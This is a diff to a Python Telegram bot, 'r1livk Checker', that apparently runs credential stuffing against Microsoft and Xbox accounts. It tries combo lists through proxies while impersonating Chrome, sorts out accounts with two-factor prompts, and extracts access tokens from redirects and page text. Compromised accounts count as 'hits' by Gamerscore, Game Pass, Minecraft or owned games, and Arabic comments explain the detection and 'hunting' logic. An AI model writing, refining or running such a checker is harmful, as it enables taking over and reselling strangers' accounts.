@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*-
 """
-r1livk Checker ⚡ - Telegram Bot (Heavy Gaming Edition - Fixed Token & Hits Extraction)
+r1livk Checker ⚡ - Telegram Bot (Heavy Gaming Edition - No Rewards)
 """
 
 import os
@@ -149,6 +149,7 @@ def test_single_proxy(proxy):
     return False, 0
 
 def fetch_heavy_xbox_details(session, xb_token, uhs, proxy_dict):
+    """فحص ثقيل ومباشر للألعاب، الـ Game Pass، والـ Gamerscore بدون أي ربط بالريوردز"""
     game_pass_status = "none"
     owned_games_formatted = []
     
@@ -269,40 +270,41 @@ def check_single_account(combo, proxy_list=None):
         login_req = session.post(url_post, data=login_data, headers=headers, proxies=proxy_dict, impersonate="chrome120", allow_redirects=True, timeout=REQUEST_TIMEOUT)
         login_text = login_req.text.lower()
 
-        # فحص أدق للـ 2FA والتحقق الأمني
-        if any(x in login_req.url.lower() for x in ["proofs", "identity/confirm", "two-step", "mfa", "challenge"]) or "two-step" in login_text:
+        if any(x in login_text for x in ["two-step", "additional security", "identity/confirm?m=", "proofs", "code", "verify"]):
             return "2fa", None
 
-        # منطق استخراج الـ Access Token المحسّن والشامل
         ms_token = None
+        full_url = login_req.url
         
-        # 1. البحث في الرابط النهائي والتحويلات السابقة (History)
-        for target in [login_req.url] + [h.url for h in login_req.history]:
-            if 'access_token=' in target:
-                try:
-                    parsed_url = urlparse(target)
+        if 'access_token=' in full_url:
+            parsed_url = urlparse(full_url)
+            fragment_qs = parse_qs(parsed_url.fragment)
+            if 'access_token' in fragment_qs:
+                ms_token = fragment_qs['access_token'][0]
+            else:
+                query_qs = parse_qs(parsed_url.query)
+                if 'access_token' in query_qs:
+                    ms_token = query_qs['access_token'][0]
+
+        if not ms_token:
+            for hist_resp in login_req.history:
+                h_url = hist_resp.url
+                if 'access_token=' in h_url:
+                    parsed_url = urlparse(h_url)
                     fragment_qs = parse_qs(parsed_url.fragment)
                     if 'access_token' in fragment_qs:
                         ms_token = fragment_qs['access_token'][0]
                         break
-                    
                     query_qs = parse_qs(parsed_url.query)
                     if 'access_token' in query_qs:
                         ms_token = query_qs['access_token'][0]
                         break
-                except:
-                    pass
-        
-        # 2. البحث الشامل بالـ Regex في نصوص الروابط والصفحات إذا لم يُوجد
+
         if not ms_token:
-            all_text_to_search = login_req.text
-            for h in login_req.history:
-                all_text_to_search += " " + h.url + " " + h.text
-                
-            token_match = re.search(r'access_token=([^&\s\"\'#]+)', all_text_to_search)
+            token_match = re.search(r'access_token=([^&\s\"\']+)', login_req.text)
             if token_match:
                 ms_token = token_match.group(1)
-
+        
         if not ms_token:
             return "bad", None
 
@@ -361,6 +363,7 @@ def check_single_account(combo, proxy_list=None):
         has_active_gp = "Active" in final_gp or has_gp_basic
         has_games = len(owned_games_list) > 0
         
+        # شرط الصيد القوي: لازم يكون عنده Gamerscore محترم (>0) أو ألعاب أو ماينكرافت أو جيم باس
         is_real_hit = (gscore_int > 0) or has_mc or has_active_gp or has_games
         
         if not is_real_hit:
